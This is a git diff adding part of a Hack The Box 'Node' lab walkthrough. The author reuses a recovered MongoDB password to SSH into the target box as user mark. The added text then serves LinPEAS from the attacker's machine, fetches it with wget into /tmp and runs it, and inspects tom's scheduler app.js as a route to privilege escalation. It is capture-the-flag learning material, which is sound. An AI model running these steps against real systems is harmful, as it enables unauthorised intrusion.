@@ -281,6 +281,126 @@ I found a username `mark` and a password `5AYRft73VtFpc84k` to connect to mongod
 I tried using these credentials to log into ssh to see if it worked and it actually did!
 
 ```
+┌──(darshan㉿kali)-[~/Desktop/HackTheBox/Linux-Boxes/Node]
+└─$ ssh mark@10.10.10.58                  
+The authenticity of host '10.10.10.58 (10.10.10.58)' can't be established.
+ED25519 key fingerprint is SHA256:l5rO4mtd28sC7Bh8t7rHpUxqmHnGYUDxX1DHmLFrzrk.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.10.58' (ED25519) to the list of known hosts.
+mark@10.10.10.58's password: 
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+              .-. 
+        .-'``(|||) 
+     ,`\ \    `-`.                 88                         88 
+    /   \ '``-.   `                88                         88 
+  .-.  ,       `___:      88   88  88,888,  88   88  ,88888, 88888  88   88 
+ (:::) :        ___       88   88  88   88  88   88  88   88  88    88   88 
+  `-`  `       ,   :      88   88  88   88  88   88  88   88  88    88   88 
+    \   / ,..-`   ,       88   88  88   88  88   88  88   88  88    88   88 
+     `./ /    .-.`        '88888'  '88888'  '88888'  88   88  '8888 '88888' 
+        `-..-(   ) 
+              `-` 
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+Last login: Fri Feb 17 06:52:30 2023 from 10.10.14.14
+mark@node:~$ whoami
+mark
 
 ```
+
+Grabbing the user flag.
+
+```
+mark@node:~$ pwd
+/home/mark
+mark@node:~$ ls
+mark@node:~$ cd ..
+mark@node:/home$ ls
+frank  mark  tom
+mark@node:/home$ cd tom
+mark@node:/home/tom$ ls
+user.txt
+mark@node:/home/tom$ cat user.txt
+cat: user.txt: Permission denied
+```
+
+Now, I was denied the permission to view the flag and it was obvious that I had to either escalate my privileges to tom or root in order to view the flag.
+
+So, I decided to transfer `Linpeas` from my machine to the target machine.
+
+I started up a python server in the same directory that the script resides, using the following command:
+
+```
+python -m http.server 8081
+```
+
+Inside the target machine, I moved to `/tmp` directory where I had write privileges and downloaded the Linpeas script
+
+```
+mark@node:/home/tom$ cd /tmp 
+mark@node:/tmp$ wget http://10.10.14.53:8081/linpeas.sh
+--2023-02-17 16:28:29--  http://10.10.14.53:8081/linpeas.sh
+Connecting to 10.10.14.53:8081... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 828078 (809K) [text/x-sh]
+Saving to: 'linpeas.sh'
+
+linpeas.sh                                                      100%[====================================================================================================================================================>] 808.67K   449KB/s    in 1.8s    
+
+2023-02-17 16:28:32 (449 KB/s) - 'linpeas.sh' saved [828078/828078]
+```
+
+Gave it execute privileges.
+```
+mark@node:/tmp$ chmod +x linpeas.sh
+```
+
+And ran the script.
+
+The networking (active ports) indicated that the port `27017` was listening locally  and googling about the services running on the port, I found out that it was `MongoDB` that was running on the port `27017`
+
+```
+.....
+[-] Listening TCP:
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 127.0.0.1:27017         0.0.0.0:*               LISTEN      -
+.....### SERVICES #############################################
+[-] Running processes:USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
+.....
+tom       1196  0.0  7.3 1028640 56072 ?       Ssl  03:44   0:06 /usr/bin/node /var/www/myplace/app.js
+mongodb   1198  0.5 11.6 281956 87956 ?        Ssl  03:44   2:43 /usr/bin/mongod --auth --quiet --config /etc/mongod.conf
+tom       1199  0.0  5.9 1074616 45264 ?       Ssl  03:44   0:07 /usr/bin/node /var/scheduler/app.js
+....
+```
+
+The `services` section tells us that there is a process compiling the `app.js` file that is being run by Tom. Since we are trying to escalate our privileges to Toms’, I decided to investigate this file.
+
+```
+mark@node:/tmp$ ls -la /var/scheduler
+total 28
+drwxr-xr-x  3 root root 4096 Aug 16  2022 .
+drwxr-xr-x 15 root root 4096 Aug 16  2022 ..
+-rw-rw-r--  1 root root  910 Sep  3  2017 app.js
+drwxr-xr-x 19 root root 4096 Aug 16  2022 node_modules
+-rw-r--r--  1 root root 4709 Sep  3  2017 package-lock.json
+-rw-rw-r--  1 root root  176 Sep  3  2017 package.json
+```
+
+
+I only had the permissions to read the file, so I couldnt simply include a reverse shell in there. So, I decided to look at the contents of the file.
+
+
 
